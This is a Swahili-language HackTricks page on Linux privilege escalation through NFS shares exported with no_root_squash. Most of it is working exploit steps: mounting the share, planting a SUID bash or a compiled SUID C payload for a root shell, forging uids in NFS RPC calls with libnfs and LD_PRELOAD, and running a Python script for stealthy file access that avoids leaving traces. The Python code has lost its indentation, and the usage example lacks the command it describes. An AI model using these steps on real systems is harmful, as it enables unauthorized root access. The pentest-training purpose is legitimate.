# Privilege Escalation ya Misconfiguration ya NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Msingi ya Squashing

NFS kwa kawaida (hasa katika linux) huamini `uid` na `gid` zilizoainishwa na client inayounganisha ili kufikia files (ikiwa kerberos haitumiki). Hata hivyo, kuna configurations ambazo zinaweza kuwekwa kwenye server ili **kubadilisha tabia hii**:

- **`all_squash`**: Hufanya squashing ya access zote, ikimapping kila user na group kuwa **`nobody`** (65534 unsigned / -2 signed). Kwa hivyo, kila mtu ni `nobody` na hakuna users wanaotumika.
- **`root_squash`/`no_all_squash`**: Hii ndiyo default katika Linux na hufanya squashing ya access yenye uid 0 (root) **pekee**. Kwa hivyo, `UID` na `GID` zote zinaaminika lakini `0` hufanyiwa squash kuwa `nobody` (kwa hiyo hakuna root impersonation inayowezekana).
- **``no_root_squash`**: Configuration hii ikiwashwa haifanyi squash hata kwa root user. Hii inamaanisha kwamba ukimount directory yenye configuration hii unaweza kuifikia kama root.

Katika **/etc/exports** file, ukipata directory iliyowekwa kama **no_root_squash**, basi unaweza **kuifikia** kutoka **kama client** na **kuandika ndani** ya directory hiyo **kana kwamba** wewe ni **root** wa ndani wa machine.

Kwa maelezo zaidi kuhusu **NFS**, angalia:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 ukitumia bash:
- **Kumount directory hiyo** kwenye client machine, na **kama root kunakili** ndani ya mounted folder binary ya **/bin/bash** na kuipa rights za **SUID**, kisha **ku-execute kutoka kwenye victim** machine hiyo bash binary.
- Kumbuka kwamba ili uwe root ndani ya NFS share, **`no_root_squash`** lazima iwe configured kwenye server.
- Hata hivyo, ikiwa haijawezeshwa, unaweza kufanya escalation kwa user mwingine kwa kunakili binary kwenye NFS share na kuipa permission ya SUID kama user unayetaka kufanya escalation kwake.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 kwa kutumia code iliyocompile ya C:
- **Kumount directory hiyo** kwenye client machine, na **kama root kunakili** ndani ya folder iliyomount payload yetu iliyocompile ambayo itatumia vibaya permission ya SUID, kuipa haki za **SUID**, na **kuexecute kutoka kwenye victim** machine binary hiyo (unaweza kupata baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) hapa).
- Vizuizi vilevile kama hapo awali
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye mashine yako hadi kwenye mashine ya victim bado unaweza kutumia toleo la Remote ku-exploit privilege escalation hii kwa ku-tunnel ports zinazohitajika**.\
> Trick ifuatayo inahitajika ikiwa faili `/etc/exports` **inaonyesha IP**. Katika hali hii **hutaweza kutumia** kwa vyovyote vile **remote exploit**, na utahitaji **kutumia vibaya trick hii**.\
> Sharti lingine linalohitajika ili exploit ifanye kazi ni kwamba **export iliyo ndani ya `/etc/export`** **lazima iwe inatumia flag ya `insecure`**.\
> --_Sina uhakika kama trick hii itafanya kazi ikiwa `/etc/export` inaonyesha anwani ya IP_--

### Maelezo ya Msingi

Hali hii inahusisha ku-exploit NFS share iliyomountiwa kwenye mashine ya ndani, kwa kutumia udhaifu katika specification ya NFSv3 unaomruhusu client kubainisha uid/gid yake, hivyo kuwezesha access isiyoidhinishwa. Exploitation inahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), library inayowezesha kughushi NFS RPC calls.<sup>[[1]](#references)</sup>

#### Ku-compile Library

Hatua za ku-compile library zinaweza kuhitaji marekebisho kulingana na kernel version. Katika hali hii mahususi, syscalls za fallocate ziliwekwa kwenye maoni. Mchakato wa compilation unahusisha commands zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Kuendesha Exploit

Exploit inahusisha kuunda programu rahisi ya C (`pwn.c`) inayoongeza privileges hadi root na kisha kuendesha shell. Programu inacompile, na binary inayotokana (`a.out`) inawekwa kwenye share ikiwa na suid root, kwa kutumia `ld_nfs.so` kuiga uid katika RPC calls:

1. **Compile code ya exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Weka exploit kwenye share na ubadilishe permissions zake kwa kughushi uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Tekeleza exploit ili kupata root privileges:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell kwa Ufikiaji wa Faili kwa Stealth

Baada ya kupata root access, ili kuingiliana na NFS share bila kubadilisha ownership (ili kuepuka kuacha traces), Python script (nfsh.py) hutumiwa. Script hii hurekebisha uid ili ilingane na ile ya faili inayofikiwa, na hivyo kuruhusu kuingiliana na faili zilizo kwenye share bila matatizo ya permissions:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Endesha kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Marejeo

- [1] [Hadithi ya NFS privesc isiyojulikana sana](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
